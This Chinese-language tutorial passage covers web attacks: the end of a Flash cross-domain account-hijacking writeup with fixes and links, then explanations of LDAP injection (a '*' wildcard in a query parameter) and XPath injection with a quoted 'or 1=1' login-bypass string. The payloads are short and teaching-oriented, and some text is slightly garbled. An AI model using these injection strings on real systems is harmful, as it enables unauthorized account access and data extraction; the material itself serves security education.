Jeary:wooyun-2010-0116229：[http://www.wooyun.org/bugs/wooyun-2010-0116229](http://www.wooyun.org/bugs/wooyun-2010-0116229)

搜狐视频劫持任意帐号（需交互）

**5. 修复方案**

---
1.严格配置信任域，尽量缩小域范围，如只配置一个域，i.test.com

2.如果需要通讯的域太多，严格验证上传的文件内容

3.请求验证token

**6.相关资源**

---

http://www.freebuf.com/articles/web/35353.html

http://www.freebuf.com/articles/web/37432.html

https://github.com/gursev/flash-xdomain-xploit

https://github.com/nccgroup/CrossSiteContentHijacking

http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/

http://jeary.org/?post=54

— jeary 2015/07/30 11:22


##LDAP注入（LDAP Injection）
  LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与X.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。 
LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。LDAP是一个用来发布目录信息到许多不同资源的协议。通常它都作为一个集中的地址本使用，不过根据组织者的需要，它可以做得更加强大。 假如一个允许进行LDAP查询的机构存在未校验的输入，那么就会存在LDAP注入，这种威胁可以让攻击者能够从LADP树中提取到很多很重要的信息。 假设有一个网站允许查询 目录服务中的员工的级别： 
	http://www.test.com/employee.aspuser=Jeck

 最简单的方法就是将Jeck换成”*”那么，LDAP查询将会返回所有的员工级别信息。 
 参考资料[http://drops.wooyun.org/tips/967]

##XPATH注入(XPATH Injection)
在很多WEB应用中常常会用XML格式来储存数据（国外占多数），而XPATH就是一个XML文档中解析和提取数据的查询语言（类似于SQL语言）。如果我们能控制一个XAPTH输入点，那么我们可以像注入SQL一样的去注入XPATH，当然你不能用SQL语句以及UNION联合查询。 假设有一个XML文档为 

	<users>
	<user>
	<name>11</name>
	<username>Murkfox</username>
	<password>password123!</password>
	 <admin>1</admin>
	</user>
	<user>
	<name>Chris Stevens</name>
	 <username>ctothes</username>
	<password>reddit12</password> 12. <admin>0</admin>
	</user>
	</users> 一个非常简单的web表单使用用户名“Murkfox”和密码“password123!”输入到表单中，后台执行的查询语法如下 * ： /[1]/user[username=”Murkfox”and password=”password123!”]* 返回的用户节点 1.<user>
	<name>11</name>
	<username>Murkfox</username>
	<password>password123!</password>
	<admin>1</admin>
	</user>
	
假如服务端没有进行输入检查，那么一个XPATH注入就诞生了，它的核心问题和本质同其他注入一样，都是因为用户所能控制的输入被拼接或伪装成了程序的执行命令，而被服务端执行。 假设它的认证过程是这样的 /*[1]/user[username=”Murkfox”and password=”password123!”] 攻击者也可以提交以下内容 username: Murkfox“or “1” =“1password: anything 表达式为 Username=’Murkfox’ or 1=1 or ‘a’=’b’ 那么就可以表示为 （a or b）or （c and d） 由于逻辑操作符and的优先级高于or 所以，如果a或者b为真表达式不管c and d返回什么都是真的，攻击者就可以登录。这就是用XAPTH注入绕过验证机制。